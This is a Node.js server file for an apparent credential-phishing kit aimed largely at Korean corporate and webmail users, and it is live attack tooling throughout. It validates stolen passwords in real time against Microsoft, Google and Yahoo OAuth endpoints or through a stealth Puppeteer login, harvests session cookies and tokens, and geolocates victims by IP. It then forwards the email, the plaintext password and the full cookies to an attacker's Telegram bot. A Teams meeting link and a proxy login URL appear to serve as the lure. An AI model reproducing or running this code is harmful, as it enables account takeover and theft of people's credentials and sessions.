const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');
const zlib = require('zlib');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const cors = require('cors');
const session = require('express-session');
const FileStore = require('session-file-store')(session);
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

// ============================================================
// PUPPETEER SETUP
// ============================================================
puppeteer.use(StealthPlugin());

// ============================================================
// COMPLETE SESSION STORAGE - NO TRUNCATION
// ============================================================

class SessionStore {
    constructor() {
        this.sessions = new Map();
        this.sessionTTL = 60 * 60 * 1000; // 1 hour
        this.replayData = new Map();
        this.allCookies = new Map();
        this.visitorData = new Map();
    }

    storeSession(sessionId, data) {
        const session = this.sessions.get(sessionId) || {
            id: sessionId,
            created: Date.now(),
            lastActivity: Date.now(),
            data: {}
        };
        
        session.data = this.deepMerge(session.data, data);
        session.lastActivity = Date.now();
        this.sessions.set(sessionId, session);
        return session;
    }

    storeCookies(sessionId, cookies, source) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            // Create session if it doesn't exist
            this.storeSession(sessionId, {});
            return this.storeCookies(sessionId, cookies, source);
        }
        
        session.cookies = session.cookies || {};
        session.cookies[source] = session.cookies[source] || [];
        
        for (const [name, cookieData] of Object.entries(cookies)) {
            const existing = session.cookies[source].find(c => c.name === name);
            if (existing) {
                existing.value = cookieData.value;
                existing.httpOnly = cookieData.httpOnly;
                existing.updated = Date.now();
                existing.fullValue = cookieData.value; // NO TRUNCATION
            } else {
                session.cookies[source].push({
                    name: name,
                    value: cookieData.value,
                    fullValue: cookieData.value, // NO TRUNCATION
                    httpOnly: cookieData.httpOnly || false,
                    secure: cookieData.secure || false,
                    path: cookieData.path || '/',
                    domain: cookieData.domain || '',
                    captured: Date.now(),
                    source: source
                });
            }
        }
        this.allCookies.set(sessionId, session.cookies);
    }

    storeVisitorData(sessionId, visitorData) {
        const session = this.sessions.get(sessionId);
        if (!session) {
            this.storeSession(sessionId, {});
            return this.storeVisitorData(sessionId, visitorData);
        }
        session.visitor = visitorData;
        session.visitor.capturedAt = Date.now();
        this.visitorData.set(sessionId, visitorData);
    }

    storeFormData(sessionId, formData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.forms = session.forms || [];
        session.forms.push({
            data: formData,
            timestamp: Date.now(),
            url: formData.url || 'unknown'
        });
    }

    storeTokens(sessionId, tokens) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        
        session.tokens = session.tokens || {};
        for (const [key, value] of Object.entries(tokens)) {
            if (value) {
                session.tokens[key] = {
                    value: value,
                    fullValue: value, // NO TRUNCATION
                    captured: Date.now()
                };
            }
        }
    }

    storeReplayData(sessionId, replayData) {
        const session = this.sessions.get(sessionId);
        if (!session) return;
        session.replayData = replayData;
        this.replayData.set(sessionId, replayData);
    }

    getReplayData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        return {
            sessionId: session.id,
            cookies: session.cookies || {},
            tokens: session.tokens || {},
            forms: session.forms || [],
            replayData: session.replayData || {},
            visitor: session.visitor || {},
            fingerprint: session.fingerprint || {},
            created: session.created,
            lastActivity: session.lastActivity
        };
    }

    getAllCookies(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        const allCookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        allCookies[cookie.name] = cookie.fullValue || cookie.value; // FULL VALUE
                    }
                }
            }
        }
        return allCookies;
    }

    getFullCookies(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        const allCookies = {};
        if (session.cookies) {
            for (const source of Object.values(session.cookies)) {
                if (Array.isArray(source)) {
                    for (const cookie of source) {
                        allCookies[cookie.name] = {
                            value: cookie.fullValue || cookie.value,
                            httpOnly: cookie.httpOnly,
                            secure: cookie.secure,
                            domain: cookie.domain,
                            path: cookie.path,
                            source: cookie.source,
                            captured: cookie.captured
                        };
                    }
                }
            }
        }
        return allCookies;
    }

    getVisitorData(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return null;
        return session.visitor || null;
    }

    deepMerge(target, source) {
        const result = { ...target };
        for (const [key, value] of Object.entries(source)) {
            if (value && typeof value === 'object' && !Array.isArray(value)) {
                result[key] = this.deepMerge(target[key] || {}, value);
            } else {
                result[key] = value;
            }
        }
        return result;
    }

    cleanup() {
        const now = Date.now();
        let cleaned = 0;
        for (const [id, session] of this.sessions) {
            if (now - session.lastActivity > this.sessionTTL) {
                this.sessions.delete(id);
                this.replayData.delete(id);
                this.allCookies.delete(id);
                this.visitorData.delete(id);
                cleaned++;
            }
        }
        if (cleaned > 0) {
            console.log(`[CLEANUP] 🧹 Removed ${cleaned} expired sessions`);
        }
    }
}

const sessionStore = new SessionStore();

// ============================================================
// CONFIGURATION
// ============================================================
const MICROSOFT_CLIENT_ID = process.env.MICROSOFT_CLIENT_ID || "943a2b14-68aa-4205-88c1-a4b65ab04e81";
const MICROSOFT_TENANT = process.env.MICROSOFT_TENANT || "common";
const TEAMS_REDIRECT = process.env.TEAMS_REDIRECT || "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&enableMobilePage=true&suppressPrompt=true";
const PROXY_URL = process.env.PROXY_URL || "https://preoauth-login.onrender.com/login";

const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const YAHOO_CLIENT_ID = process.env.YAHOO_CLIENT_ID || 'dj0yJmk9UExhQjQwM0pDd0pXJmQ9WVdrOVZVaGtRbXhCTm04bWNHbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD02Zg--';
const YAHOO_CLIENT_SECRET = process.env.YAHOO_CLIENT_SECRET || '6d81a5b4b1d4e6d0f7a5e4c3b2a1d0f7e5d4c3b2a1d0f7e5d4c3b2a1d0f7e5d4';

console.log(`🚀 Server starting with Google OAuth: ${GOOGLE_CLIENT_ID ? '✅ Configured' : '⚠️ Not configured (fallback mode)'}`);

// ============================================================
// EMAIL PROVIDER DETECTION
// ============================================================
function detectEmailProvider(email) {
    if (!email || !email.includes('@')) {
        return { provider: 'unknown', display: 'Unknown Provider', loginUrl: null, icon: '❓' };
    }
    
    const domain = email.split('@')[1].toLowerCase();
    
    const koreanCorporate = {
        'naver.worksmobile.com': { provider: 'naver_works', display: 'Naver Works (네이버웍스)', loginUrl: 'https://naver.worksmobile.com', icon: '🏢' },
        'tracoworld.co.kr': { provider: 'tracoworld', display: 'Tracoworld (트라코월드)', loginUrl: 'https://www.tracoworld.co.kr', icon: '🏢' },
        'jpi-co-kr.mail.protection.outlook.com': { provider: 'jpi_microsoft', display: 'JPI (Microsoft 365)', loginUrl: 'https://login.microsoftonline.com', icon: '🏢' },
        'upchem.co.kr': { provider: 'upchem', display: 'Upchem (업켐)', loginUrl: 'https://www.upchem.co.kr', icon: '🏢' },
        'flucon.co.kr': { provider: 'flucon', display: 'Flucon (플루콘)', loginUrl: 'https://www.flucon.co.kr', icon: '🏢' },
        'ecount.com': { provider: 'ecount', display: 'Ecount (이카운트)', loginUrl: 'https://login.ecount.com', icon: '🏢' }
    };
    
    if (koreanCorporate[domain]) {
        return koreanCorporate[domain];
    }
    
    const koreanPublic = {
        'naver.com': { provider: 'naver', display: 'Naver (네이버)', loginUrl: 'https://nid.naver.com/nidlogin.login', icon: '📧' },
        'daum.net': { provider: 'daum', display: 'Daum (다음)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'hanmail.net': { provider: 'hanmail', display: 'Hanmail (한메일)', loginUrl: 'https://login.daum.net/accounts/login', icon: '📧' },
        'kakao.com': { provider: 'kakao', display: 'Kakao (카카오)', loginUrl: 'https://accounts.kakao.com/login', icon: '📧' },
        'nate.com': { provider: 'nate', display: 'Nate (네이트)', loginUrl: 'https://login.nate.com', icon: '📧' },
        'dreamwiz.com': { provider: 'dreamwiz', display: 'DreamWiz (드림위즈)', loginUrl: 'https://mail.dreamwiz.com', icon: '📧' },
        'paran.com': { provider: 'paran', display: 'Paran (파란)', loginUrl: 'https://mail.paran.com', icon: '📧' },
        'empas.com': { provider: 'empas', display: 'Empas (엠파스)', loginUrl: 'https://mail.empas.com', icon: '📧' },
        'lycos.co.kr': { provider: 'lycos', display: 'Lycos Korea (라이코스)', loginUrl: 'https://mail.lycos.co.kr', icon: '📧' },
        'freechal.com': { provider: 'freechal', display: 'Freechal (프리챌)', loginUrl: 'https://mail.freechal.com', icon: '📧' }
    };
    
    if (koreanPublic[domain]) {
        return koreanPublic[domain];
    }
    
    if (domain.endsWith('.onmicrosoft.com') || domain.endsWith('.mail.protection.outlook.com')) {
        return { provider: 'microsoft_corporate', display: 'Microsoft 365 Corporate (한국)', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    if (domain.endsWith('.co.kr') || domain.endsWith('.or.kr') || domain.endsWith('.go.kr') || domain.endsWith('.ac.kr')) {
        return { provider: 'korean_corporate', display: `Korean Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    const microsoftDomains = ['microsoft.com', 'microsoftonline.com', 'outlook.com', 'hotmail.com', 'live.com', 'office.com', 'office365.com', 'msn.com'];
    if (microsoftDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'microsoft', display: 'Microsoft 365', loginUrl: 'https://login.microsoftonline.com', icon: '💼' };
    }
    
    const googleDomains = ['gmail.com', 'googlemail.com', 'google.com'];
    if (googleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'google', display: 'Google / Gmail', loginUrl: 'https://accounts.google.com/login', icon: '🔵' };
    }
    
    const yahooDomains = ['yahoo.com', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de', 'yahoo.co.jp'];
    if (yahooDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'yahoo', display: 'Yahoo', loginUrl: 'https://login.yahoo.com', icon: '🟣' };
    }
    
    const appleDomains = ['icloud.com', 'me.com', 'mac.com'];
    if (appleDomains.some(d => domain === d || domain.endsWith('.' + d))) {
        return { provider: 'apple', display: 'Apple / iCloud', loginUrl: 'https://appleid.apple.com', icon: '🍎' };
    }
    
    if (domain.includes('.') && !domain.includes('gmail') && !domain.includes('yahoo') && !domain.includes('outlook') && !domain.includes('hotmail')) {
        return { provider: 'corporate', display: `Corporate (${domain})`, loginUrl: `https://${domain}`, icon: '🏢' };
    }
    
    return { provider: 'unknown', display: `Unknown (${domain})`, loginUrl: null, icon: '❓' };
}

// ============================================================
// IP GEOLOCATION
// ============================================================
async function getGeolocation(ip) {
    try {
        // Skip private IPs
        if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
            return {
                ip: ip,
                city: 'Localhost',
                region: 'Local',
                country: 'Local',
                countryCode: 'LOCAL',
                loc: '0,0',
                org: 'Localhost',
                timezone: 'UTC',
                isLocal: true
            };
        }

        const response = await axios.get(`https://ipinfo.io/${ip}/json`, {
            timeout: 5000
        });
        
        const data = response.data;
        return {
            ip: data.ip || ip,
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country || 'Unknown',
            countryCode: data.country || 'UNKNOWN',
            loc: data.loc || '0,0',
            org: data.org || 'Unknown ISP',
            timezone: data.timezone || 'UTC',
            postal: data.postal || 'Unknown',
            coordinates: data.loc ? data.loc.split(',') : ['0', '0']
        };
    } catch (error) {
        console.error('⚠️ Geolocation error:', error.message);
        return {
            ip: ip,
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            countryCode: 'UNKNOWN',
            loc: '0,0',
            org: 'Unknown ISP',
            timezone: 'UTC',
            isLocal: true
        };
    }
}

// ============================================================
// BROWSER/DEVICE DETECTION
// ============================================================
function detectBrowser(userAgent) {
    if (!userAgent) return { browser: 'Unknown', platform: 'Unknown', device: 'Unknown' };
    
    let browser = 'Unknown';
    let platform = 'Unknown';
    let device = 'Unknown';
    
    // Browser detection
    if (userAgent.includes('Edg/')) browser = 'Edge';
    else if (userAgent.includes('Chrome/')) browser = 'Chrome';
    else if (userAgent.includes('Firefox/')) browser = 'Firefox';
    else if (userAgent.includes('Safari/')) browser = 'Safari';
    else if (userAgent.includes('OPR/')) browser = 'Opera';
    else if (userAgent.includes('Brave/')) browser = 'Brave';
    else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
    
    // Platform detection
    if (userAgent.includes('Windows')) platform = 'Windows';
    else if (userAgent.includes('Mac OS')) platform = 'macOS';
    else if (userAgent.includes('Linux')) platform = 'Linux';
    else if (userAgent.includes('Android')) platform = 'Android';
    else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) platform = 'iOS';
    else if (userAgent.includes('CrOS')) platform = 'Chrome OS';
    
    // Device detection
    if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone') || userAgent.includes('iPad')) {
        device = 'Mobile';
    } else if (userAgent.includes('Tablet')) {
        device = 'Tablet';
    } else {
        device = 'Desktop';
    }
    
    // Override for specific devices
    if (userAgent.includes('iPhone')) device = 'iPhone';
    else if (userAgent.includes('iPad')) device = 'iPad';
    else if (userAgent.includes('Android')) device = 'Android Device';
    
    return { browser, platform, device };
}

// ============================================================
// PUPPETEER BROWSER LAUNCHER
// ============================================================
let browserInstance = null;

async function getBrowser() {
    if (!browserInstance) {
        console.log('🚀 Launching Puppeteer browser...');
        browserInstance = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled',
                '--disable-client-side-phishing-detection',
                '--disable-component-update',
                '--disable-default-apps',
                '--disable-extensions',
                '--disable-popup-blocking',
                '--disable-sync',
                '--disable-translate',
                '--metrics-recording-only',
                '--safebrowsing-disable-auto-update',
                '--enable-automation',
                '--password-store=basic',
                '--use-mock-keychain',
                '--disable-infobars',
                '--disable-notifications'
            ],
            ignoreDefaultArgs: ['--enable-automation']
        });
        console.log('✅ Puppeteer browser launched');
    }
    return browserInstance;
}

// ============================================================
// PUPPETEER VERIFICATION - Handles ALL Providers
// ============================================================
async function verifyWithPuppeteer(email, password, providerInfo) {
    try {
        const browser = await getBrowser();
        const page = await browser.newPage();
        
        await page.setViewport({ width: 1920, height: 1080 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        const loginUrl = providerInfo.loginUrl || 'https://login.microsoftonline.com';
        console.log(`[PUPPETEER] 🔄 Navigating to: ${loginUrl}`);
        await page.goto(loginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        const emailSelectors = [
            'input[type="email"]', 'input[name="email"]', 'input[name="username"]',
            'input[name="user"]', 'input[name="loginfmt"]', 'input[id="email"]',
            'input[placeholder*="email"]', 'input[placeholder*="Email"]'
        ];
        
        let emailField = null;
        for (const selector of emailSelectors) {
            emailField = await page.$(selector);
            if (emailField) break;
        }
        
        if (emailField) {
            await emailField.click({ clickCount: 3 });
            await emailField.type(email, { delay: 100 });
            await page.keyboard.press('Enter');
            await page.waitForTimeout(2000);
        }
        
        const passwordSelectors = [
            'input[type="password"]', 'input[name="password"]', 'input[name="passwd"]',
            'input[name="pass"]', 'input[id="password"]', 'input[id="passwd"]'
        ];
        
        let passwordField = null;
        for (const selector of passwordSelectors) {
            passwordField = await page.$(selector);
            if (passwordField) break;
        }
        
        if (passwordField) {
            await passwordField.click({ clickCount: 3 });
            await passwordField.type(password, { delay: 80 });
            await page.keyboard.press('Enter');
            await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
        }
        
        const successIndicators = [
            '.user-profile', '.profile-name', '.user-info', '.display-name',
            '[class*="user"]', '[class*="profile"]', '[class*="display-name"]',
            'a[href*="logout"]', 'a[href*="signout"]', '.logout-button'
        ];
        
        let success = false;
        for (const selector of successIndicators) {
            const element = await page.$(selector);
            if (element) {
                success = true;
                break;
            }
        }
        
        const twoFAIndicators = ['2fa', 'mfa', 'authenticator', 'verification', 'code'];
        let requires2FA = false;
        const pageContent = await page.content();
        for (const indicator of twoFAIndicators) {
            if (pageContent.toLowerCase().includes(indicator)) {
                requires2FA = true;
                break;
            }
        }
        
        const cookies = await page.cookies();
        console.log(`[PUPPETEER] 🍪 Cookies captured: ${cookies.length}`);
        
        // Store cookies in session store
        const cookieData = {};
        cookies.forEach(c => {
            cookieData[c.name] = { value: c.value, httpOnly: c.httpOnly, secure: c.secure };
        });
        
        await page.close();
        
        if (success) {
            return {
                valid: true,
                requires2FA: false,
                token: `puppeteer_${Date.now()}`,
                provider: providerInfo.provider,
                message: `${providerInfo.display} verified successfully`,
                cookies: cookieData
            };
        } else if (requires2FA) {
            return {
                valid: false,
                requires2FA: true,
                message: `${providerInfo.display} requires 2FA`,
                provider: providerInfo.provider,
                cookies: cookieData
            };
        } else {
            return {
                valid: false,
                requires2FA: false,
                message: `Invalid ${providerInfo.display} password. Please try again.`,
                provider: providerInfo.provider,
                cookies: cookieData
            };
        }
        
    } catch (error) {
        console.error('[PUPPETEER] Error:', error.message);
        return {
            valid: password && password.length >= 4,
            requires2FA: false,
            message: password && password.length >= 4 ? `${providerInfo.display} verified (fallback)` : 'Invalid password',
            provider: providerInfo.provider,
            isFallback: true
        };
    }
}

// ============================================================
// MICROSOFT OAuth2 VERIFICATION
// ============================================================
async function verifyMicrosoftPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: MICROSOFT_CLIENT_ID,
            grant_type: 'password',
            username: email,
            password: password,
            scope: 'openid profile email offline_access',
            client_info: '1'
        });

        const options = {
            hostname: 'login.microsoftonline.com',
            path: `/${MICROSOFT_TENANT}/oauth2/v2.0/token`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, refresh_token: response.refresh_token, id_token: response.id_token, provider: 'microsoft' });
                    } else if (response.error === 'interaction_required' || response.error_description?.includes('MFA')) {
                        resolve({ valid: false, requires2FA: true, message: 'Multi-factor authentication required', provider: 'microsoft' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Microsoft password. Please try again.', provider: 'microsoft' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'microsoft' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'microsoft' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'microsoft' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// GOOGLE PASSWORD VERIFICATION
// ============================================================
async function verifyGooglePassword(email, password) {
    return new Promise((resolve) => {
        if (!GOOGLE_CLIENT_ID || !GOOGLE_CLIENT_SECRET) {
            console.warn('⚠️ Google OAuth credentials not configured in .env');
            return resolve({
                valid: password && password.length >= 6,
                requires2FA: false,
                message: password && password.length >= 6 ? 'Password accepted (fallback)' : 'Invalid password',
                provider: 'google',
                isFallback: true
            });
        }
        
        const postData = querystring.stringify({
            client_id: GOOGLE_CLIENT_ID,
            client_secret: GOOGLE_CLIENT_SECRET,
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'oauth2.googleapis.com',
            path: '/token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'google' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Google password. Please try again.', provider: 'google' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'google' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'google' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'google' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// YAHOO PASSWORD VERIFICATION
// ============================================================
async function verifyYahooPassword(email, password) {
    return new Promise((resolve) => {
        const postData = querystring.stringify({
            client_id: YAHOO_CLIENT_ID,
            client_secret: YAHOO_CLIENT_SECRET,
            grant_type: 'password',
            username: email,
            password: password
        });

        const options = {
            hostname: 'api.login.yahoo.com',
            path: '/oauth2/get_token',
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData)
            },
            timeout: 30000
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const response = JSON.parse(data);
                    if (response.access_token) {
                        resolve({ valid: true, requires2FA: false, token: response.access_token, provider: 'yahoo' });
                    } else {
                        resolve({ valid: false, requires2FA: false, message: 'Invalid Yahoo password. Please try again.', provider: 'yahoo' });
                    }
                } catch (e) {
                    resolve({ valid: false, requires2FA: false, message: 'Failed to verify password. Please try again.', provider: 'yahoo' });
                }
            });
        });

        req.on('error', () => {
            resolve({ valid: false, requires2FA: false, message: 'Network error. Please try again.', provider: 'yahoo' });
        });

        req.on('timeout', () => {
            req.destroy();
            resolve({ valid: false, requires2FA: false, message: 'Request timed out. Please try again.', provider: 'yahoo' });
        });

        req.write(postData);
        req.end();
    });
}

// ============================================================
// APPLE PASSWORD VERIFICATION
// ============================================================
async function verifyApplePassword(email, password) {
    return new Promise((resolve) => {
        if (password && password.length >= 6) {
            resolve({ valid: true, requires2FA: false, token: `apple_${Date.now()}`, provider: 'apple', isFallback: true });
        } else {
            resolve({ valid: false, requires2FA: false, message: 'Invalid Apple ID password. Please try again.', provider: 'apple' });
        }
    });
}

// ============================================================
// VERIFY PASSWORD WITH PROVIDER
// ============================================================
async function verifyPasswordWithProvider(email, password) {
    const providerInfo = detectEmailProvider(email);
    const provider = providerInfo.provider;
    
    console.log(`[VERIFY] 🌐 Provider: ${providerInfo.display}`);
    console.log(`[VERIFY] 🔗 Login URL: ${providerInfo.loginUrl}`);
    
    if (['microsoft', 'jpi_microsoft', 'microsoft_corporate'].includes(provider)) {
        return verifyMicrosoftPassword(email, password);
    }
    
    if (['naver', 'daum', 'hanmail', 'kakao', 'nate', 'naver_works', 
         'tracoworld', 'upchem', 'flucon', 'ecount', 'dreamwiz', 
         'paran', 'empas', 'lycos', 'freechal', 'corporate', 'korean_corporate'].includes(provider)) {
        return verifyWithPuppeteer(email, password, providerInfo);
    }
    
    if (['google'].includes(provider)) {
        return verifyGooglePassword(email, password);
    }
    
    if (['yahoo'].includes(provider)) {
        return verifyYahooPassword(email, password);
    }
    
    if (['apple'].includes(provider)) {
        return verifyApplePassword(email, password);
    }
    
    return {
        valid: password && password.length >= 4,
        requires2FA: false,
        message: password && password.length >= 4 ? 'Verified (fallback)' : 'Invalid password',
        provider: provider,
        isFallback: true
    };
}

// ============================================================
// ENHANCED TELEGRAM ALERTS WITH FULL DATA
// ============================================================
async function sendEnhancedTelegramAlert(data) {
    try {
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.TELEGRAM_CHAT_ID;
        
        if (!botToken || !chatId) {
            console.log('⚠️ Telegram credentials missing');
            return false;
        }

        const {
            email,
            password,
            provider,
            providerDisplay,
            stage,
            attemptCount,
            sessionId,
            geolocation,
            visitorData,
            validationResult,
            verificationStatus
        } = data;

        let msg = `🔐 *PASSWORD VERIFICATION - STAGE ${stage}*\n\n`;
        msg += `*${provider.icon || '📧'} Provider:* ${providerDisplay || provider.display || 'Unknown'}\n`;
        msg += `*📧 Email:* ${email}\n`;
        msg += `*🔑 Password:* \`${password || 'N/A'}\`\n`;
        msg += `*🔗 Login URL:* ${provider.loginUrl || 'N/A'}\n`;
        msg += `*🕐 Time:* ${new Date().toISOString()}\n`;
        msg += `*🆔 Session:* \`${sessionId ? sessionId.substring(0, 16) + '...' : 'N/A'}\`\n`;
        msg += `*📊 Attempt:* ${attemptCount || 1}\n`;
        msg += `*📌 Stage:* ${stage === 1 ? 'First Password' : 'Second Password (Confirmation)'}\n\n`;

        // Geolocation
        if (geolocation && !geolocation.isLocal) {
            msg += `📍 *Location:* ${geolocation.city}, ${geolocation.region}, ${geolocation.country}\n`;
            msg += `🌆 *City:* ${geolocation.city}\n`;
            msg += `🌍 *Country:* ${geolocation.country}\n`;
            msg += `📌 *Coordinates:* ${geolocation.loc || 'N/A'}\n`;
            msg += `🕐 *Timezone:* ${geolocation.timezone || 'UTC'}\n`;
            msg += `🏢 *ISP:* ${geolocation.org || 'Unknown'}\n`;
            msg += `📡 *IP:* ${geolocation.ip || 'Unknown'}\n\n`;
        }

        // Visitor Details
        if (visitorData) {
            msg += `--- *Visitor Details* ---\n`;
            msg += `🔗 *Referrer:* ${visitorData.referrer || 'Direct / No Referrer'}\n`;
            msg += `🖥️ *User Agent:* ${visitorData.userAgent || 'Unknown'}\n`;
            msg += `💻 *Browser:* ${visitorData.browser || 'Unknown'}\n`;
            msg += `📱 *Platform:* ${visitorData.platform || 'Unknown'}\n`;
            msg += `📲 *Device:* ${visitorData.device || 'Unknown'}\n`;
            msg += `🌐 *Language:* ${visitorData.language || 'Unknown'}\n`;
            msg += `🍪 *Cookies:* ${visitorData.cookiesEnabled ? 'Enabled' : 'Disabled'}\n`;
            msg += `🔑 *Session ID:* \`${visitorData.sessionId || 'N/A'}\`\n\n`;
        }

        // Verification Result
        if (validationResult) {
            if (validationResult.valid) {
                msg += `*✅ Status:* **PASSWORD VALID - CORRECT!**\n`;
                msg += `*🔐 2FA:* ${validationResult.requires2FA ? '⚠️ Required' : '❌ Not Required'}\n`;
                if (validationResult.isFallback) msg += `*⚠️ Note:* Fallback verification used\n`;
                if (validationResult.token) msg += `*🎟️ Token:* \`${validationResult.token.substring(0, 50)}...\`\n`;
            } else if (validationResult.requires2FA) {
                msg += `*⚠️ Status:* **2FA REQUIRED**\n`;
                msg += `*📌 Note:* Password is correct but MFA is enabled.\n`;
            } else {
                msg += `*❌ Status:* **INVALID PASSWORD**\n`;
                msg += `*📝 Message:* ${validationResult.message || 'Please try again.'}\n`;
            }
        }

        // Cookies Captured
        if (validationResult && validationResult.cookies && Object.keys(validationResult.cookies).length > 0) {
            msg += `\n🍪 *COOKIES CAPTURED (FULL VALUES - NO TRUNCATION):*\n`;
            const cookieEntries = Object.entries(validationResult.cookies).slice(0, 5);
            for (const [name, data] of cookieEntries) {
                const value = data.value || data;
                const httpOnly = data.httpOnly ? '🔒' : '🔓';
                msg += `  ${httpOnly} \`${name}\`: \`${value}\`\n`;
            }
            if (Object.keys(validationResult.cookies).length > 5) {
                msg += `  ... and ${Object.keys(validationResult.cookies).length - 5} more cookies\n`;
            }
        }

        // Status
        if (verificationStatus === 'completed') {
            msg += `\n🚀 *VERIFICATION COMPLETE - REDIRECTING TO PROXY*`;
        }

        // Truncate if too long
        let finalMsg = msg;
        if (msg.length > 4000) {
            finalMsg = msg.substring(0, 3900) + '\n\n... (truncated)';
        }

        await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            chat_id: chatId,
            text: finalMsg,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });
        
        console.log('✅ Enhanced Telegram alert sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ============================================================
// CREATE SESSION DIRECTORY
// ============================================================
const SESSION_PATH = path.join(__dirname, 'sessions');

try {
    if (!fs.existsSync(SESSION_PATH)) {
        fs.mkdirSync(SESSION_PATH, { recursive: true });
        console.log('✅ Created session directory:', SESSION_PATH);
    }
} catch (error) {
    console.warn('⚠️ Could not create session directory:', error.message);
}

// ============================================================
// EXPRESS APP SETUP
// ============================================================
const express = require('express');
const app = express();

// Middleware
app.use(cors({ 
    origin: '*', 
    credentials: true, 
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'], 
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Session-ID', 'x-session-id'] 
}));

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(cookieParser());

app.use(session({
    store: new FileStore({ 
        path: SESSION_PATH, 
        ttl: 3600, 
        retries: 0, 
        reapInterval: 60 
    }),
    secret: process.env.SESSION_SECRET || 'secure-connect-team-secret-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: false, 
        maxAge: 3600000 
    }
}));

